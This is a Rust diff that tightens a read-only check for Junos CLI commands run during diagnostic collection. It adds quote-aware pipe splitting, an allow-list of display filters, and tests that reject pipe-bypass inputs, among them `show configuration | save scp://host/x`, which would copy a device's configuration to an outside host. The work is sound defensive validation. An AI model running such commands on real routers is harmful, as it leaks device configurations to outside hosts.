@@ -54,15 +54,64 @@ struct ArtifactSpec {
     heavy: bool,
 }
 
-/// True if `cmd` is a read-only operational command safe to run during collection:
-/// a `show`/`file show`, or a `request … information` (RSI-style). Everything else —
-/// `set`, `delete`, `configure`, `request system reboot`, `commit`, … — is rejected.
+/// Split `cmd` into pipe stages on `|`, but not a `|` that falls inside a
+/// double-quoted argument: Junos `match "error|CRC|drop"` uses `|` for regex
+/// alternation in a quoted pattern, not as a pipe separator. Returns `None` if the
+/// quoting is unbalanced — an ambiguous command is rejected rather than trusted.
+fn split_pipe_stages(cmd: &str) -> Option<Vec<&str>> {
+    let mut stages = Vec::new();
+    let mut start = 0;
+    let mut in_quotes = false;
+    for (i, ch) in cmd.char_indices() {
+        match ch {
+            '"' => in_quotes = !in_quotes,
+            '|' if !in_quotes => {
+                stages.push(&cmd[start..i]);
+                start = i + 1;
+            }
+            _ => {}
+        }
+    }
+    if in_quotes {
+        return None;
+    }
+    stages.push(&cmd[start..]);
+    Some(stages)
+}
+
+/// True if `cmd` is a read-only operational command safe to run during collection.
+///
+/// The BASE command (before any `|`) must be a `show`/`file show`, or a
+/// `request … information` (RSI-style, final token exactly `information`). Every
+/// pipe stage after it must be a known safe DISPLAY filter — this is an allow-list,
+/// so a mutating/exfiltrating pipe such as `| save scp://host/x` is rejected even
+/// though the base is a `show`. A `|` inside a quoted argument (e.g. a `match`
+/// regex with alternation) is not treated as a pipe boundary. Everything else —
+/// `set`, `delete`, `configure`, `commit`, `request system reboot`,
+/// `show … | save …` — is rejected.
 #[must_use]
 pub fn is_read_only(cmd: &str) -> bool {
-    let c = cmd.trim();
-    c.starts_with("show ")
-        || c.starts_with("file show ")
-        || (c.starts_with("request ") && c.contains(" information"))
+    /// Junos pipe modifiers that only read/format output (never write a file, etc.).
+    const SAFE_PIPE: &[&str] = &[
+        "match", "except", "count", "last", "no-more", "trim", "display", "find",
+        "begin", "hold", "resolve", "refresh",
+    ];
+    let Some(stages) = split_pipe_stages(cmd) else {
+        return false;
+    };
+    let mut stages = stages.into_iter();
+    let base = stages.next().unwrap_or("").trim();
+    let base_ok = base.starts_with("show ")
+        || base == "show"
+        || base.starts_with("file show ")
+        || (base.starts_with("request ") && base.split_whitespace().last() == Some("information"));
+    if !base_ok {
+        return false;
+    }
+    stages.all(|stage| {
+        let verb = stage.trim().split_whitespace().next().unwrap_or("");
+        SAFE_PIPE.contains(&verb)
+    })
 }
 
 impl Profile {
@@ -184,6 +233,22 @@ mod tests {
         assert!(!is_read_only("request system reboot"));
         assert!(!is_read_only("set interfaces ge-0/0/0 disable"));
         assert!(!is_read_only("configure"));
+        // pipe-bypass attempts must be rejected even though the base is `show`
+        assert!(!is_read_only("show configuration | save /tmp/x"));
+        assert!(!is_read_only("show configuration | save scp://host/x"));
+        // chained safe display pipes are allowed
+        assert!(is_read_only("show interfaces extensive | match error | count"));
+        assert!(is_read_only("show configuration | display set"));
+        // request must be an informational request, by final token
+        assert!(is_read_only("request support information"));
+        assert!(!is_read_only("request system reboot"));
+        assert!(!is_read_only("request support information | save /tmp/x"));
+        // a `|` inside a quoted match pattern is regex alternation, not a pipe
+        assert!(is_read_only(
+            "show interfaces extensive | match \"error|CRC|FEC|drop|framing\""
+        ));
+        // unbalanced quoting is ambiguous and must be rejected
+        assert!(!is_read_only("show configuration | match \"unterminated"));
     }
 
     #[test]
